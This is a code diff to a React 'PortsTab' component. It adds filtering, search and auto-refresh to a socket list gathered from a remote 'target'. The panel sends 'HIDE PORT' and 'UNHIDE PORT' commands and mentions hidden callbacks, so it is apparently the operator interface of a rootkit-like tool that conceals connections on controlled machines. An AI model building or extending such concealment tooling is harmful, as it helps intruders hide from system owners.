@@ -1,14 +1,17 @@
-import { useState, useCallback } from 'react'
-import { Network, Eye, EyeOff, Plus } from 'lucide-react'
+import { useState, useCallback, useEffect, useRef } from 'react'
+import { Network, Eye, EyeOff, Plus, Search } from 'lucide-react'
 import { Th } from '../../components/Th'
 import { useSnapshot, SnapshotBar, EmptySnapshotCta } from '../Target'
 
 const PORTS_CMD = "ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null || cat /proc/net/tcp /proc/net/tcp6 2>/dev/null"
 
-export function PortsTab({ target: t, cmd, execCmd, busy }) {
+export function PortsTab({ target: t, cmd, execCmd, busy, refreshToken }) {
   const snap = useSnapshot(`ports:${t.id}`)
   const hiddenPorts = t.hidden?.port || []
   const [hideVal, setHideVal] = useState('')
+  const [view, setView] = useState('listen')
+  const [visibility, setVisibility] = useState('all')
+  const [query, setQuery] = useState('')
 
   const capture = useCallback(() => {
     snap.setLoading(true)
@@ -79,12 +82,33 @@ export function PortsTab({ target: t, cmd, execCmd, busy }) {
       }
     })
   }, [execCmd, t.id, snap])
+  const captureRef = useRef(capture)
+  captureRef.current = capture
+  useEffect(() => {
+    if (t.online && !busy) captureRef.current()
+  }, [t.id, t.online, busy, refreshToken])
 
   const ports = snap.data || []
 
-  // merge: scanned ports + hidden ports not in scan
-  const scannedPorts = new Set(ports.map(p => p.port))
-  const extraHidden = hiddenPorts.filter(p => !scannedPorts.has(p))
+  const needle = query.trim().toLowerCase()
+  const visiblePorts = ports.filter(p => {
+    const proto = p.proto.toLowerCase()
+    const state = p.state.toUpperCase()
+    const inView = view === 'all' ||
+      (view === 'listen' && state === 'LISTEN') ||
+      (view === 'udp' && proto.startsWith('udp'))
+    if (!inView) return false
+    const hidden = hiddenPorts.includes(p.port)
+    if (visibility !== 'all' && (visibility === 'hidden') !== hidden) return false
+    if (!needle) return true
+    return [p.proto, p.local, p.foreign, p.port, p.state, p.proc]
+      .some(value => String(value || '').toLowerCase().includes(needle))
+  })
+
+  // Hidden callbacks stay visible even when the selected view excludes them.
+  const visiblePortNumbers = new Set(visiblePorts.map(p => p.port))
+  const extraHidden = visibility === 'visible' ? [] : hiddenPorts.filter(port =>
+    !visiblePortNumbers.has(port) && (!needle || port.includes(needle)))
 
   if (!snap.time && !snap.loading)
     return <EmptySnapshotCta icon={Network} title="TCP Connections"
@@ -93,28 +117,59 @@ export function PortsTab({ target: t, cmd, execCmd, busy }) {
 
   return (
     <div className="flex flex-col h-full">
-      <SnapshotBar title="Listening Ports" icon={Network} count={ports.length} hiddenCount={hiddenPorts.length}
+      <SnapshotBar title="Network Sockets" icon={Network} count={visiblePorts.length} hiddenCount={hiddenPorts.length}
         time={snap.time} loading={snap.loading} onSnapshot={capture} online={t.online && !busy} />
+      <div className="flex items-center gap-2 px-4 py-2 border-b border-border bg-bg-2">
+        <div className="flex border-2 border-border bg-bg">
+          {[
+            ['listen', 'Listening'],
+            ['udp', 'UDP'],
+            ['all', 'All'],
+          ].map(([key, label]) => (
+            <button key={key} type="button"
+              className={`px-3 py-1 text-xs font-bold border-r border-border last:border-r-0 ${view === key ? 'bg-purple text-white' : 'hover:bg-secondary'}`}
+              onClick={() => setView(key)}>
+              {label}
+            </button>
+          ))}
+        </div>
+        <div className="flex border-2 border-border bg-bg">
+          {['all', 'visible', 'hidden'].map(value => (
+            <button key={value} type="button"
+              className={`px-2.5 py-1 text-xs font-bold capitalize border-r border-border last:border-r-0 ${visibility === value ? 'bg-main text-main-fg' : 'hover:bg-secondary'}`}
+              onClick={() => setVisibility(value)}>{value}</button>
+          ))}
+        </div>
+        <label className="relative flex-1 max-w-sm">
+          <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-fg-3" />
+          <input className="nb-input w-full py-1 pl-9 pr-3 text-sm font-mono"
+            aria-label="Filter network sockets" placeholder="Filter address, port, process…"
+            value={query} onChange={e => setQuery(e.target.value)} />
+        </label>
+        <span className="ml-auto text-[10px] font-mono text-fg-3 tabular-nums">
+          {visiblePorts.length + extraHidden.length}/{ports.length + extraHidden.length}
+        </span>
+      </div>
       {snap.error && (
         <div className="p-6 text-center">
           <div className="text-red font-bold mb-1">Scan failed</div>
           <div className="text-sm text-fg-3">{snap.error}</div>
         </div>
       )}
-      {!snap.error && !ports.length && !extraHidden.length && !snap.loading ? (
+      {!snap.error && !visiblePorts.length && !extraHidden.length && !snap.loading ? (
         <div className="flex-1 flex flex-col items-center justify-center gap-2 text-fg-3 p-12">
           <Network size={24} />
-          <span className="text-sm font-bold">No listening ports detected</span>
-          <span className="text-xs">The target has no open TCP listeners right now.</span>
+          <span className="text-sm font-bold">No matching sockets</span>
+          <span className="text-xs">Change the view or clear the filter.</span>
         </div>
-      ) : !snap.error && (ports.length > 0 || extraHidden.length > 0) && (
+      ) : !snap.error && (visiblePorts.length > 0 || extraHidden.length > 0) && (
         <div className="flex-1 overflow-auto">
           <table className="w-full text-sm">
             <thead className="sticky top-0 bg-secondary border-b-2 border-border">
               <tr><Th>Proto</Th><Th>Local Address</Th><Th>Foreign Address</Th><Th>Port</Th><Th>State</Th><Th>Process</Th><Th></Th></tr>
             </thead>
             <tbody>
-              {ports.map((p, i) => {
+              {visiblePorts.map((p, i) => {
                 const isHidden = hiddenPorts.includes(p.port)
                 return (
                   <tr key={i} className={`border-b border-border hover:bg-bg-2 group ${isHidden ? 'opacity-40' : ''}`}>
@@ -134,8 +189,7 @@ export function PortsTab({ target: t, cmd, execCmd, busy }) {
                         title={isHidden ? 'Unhide port' : 'Hide port'}
                         onClick={() => {
                           if (isHidden) {
-                            const idx = hiddenPorts.indexOf(p.port)
-                            if (idx >= 0) cmd(`UNHIDE PORT ${idx}`)
+                            cmd(`UNHIDE PORT ${p.port}`)
                           } else {
                             cmd(`HIDE PORT ${p.port}`)
                           }
@@ -158,7 +212,7 @@ export function PortsTab({ target: t, cmd, execCmd, busy }) {
                   <td className="px-4 py-2 font-mono text-xs text-fg-3">-</td>
                   <td className="px-4 py-2 text-right">
                     <button className="p-1 text-green opacity-100" title="Unhide port"
-                      onClick={() => { const idx = hiddenPorts.indexOf(port); if (idx >= 0) cmd(`UNHIDE PORT ${idx}`) }}>
+                      onClick={() => cmd(`UNHIDE PORT ${port}`)}>
                       <Eye size={14} />
                     </button>
                   </td>
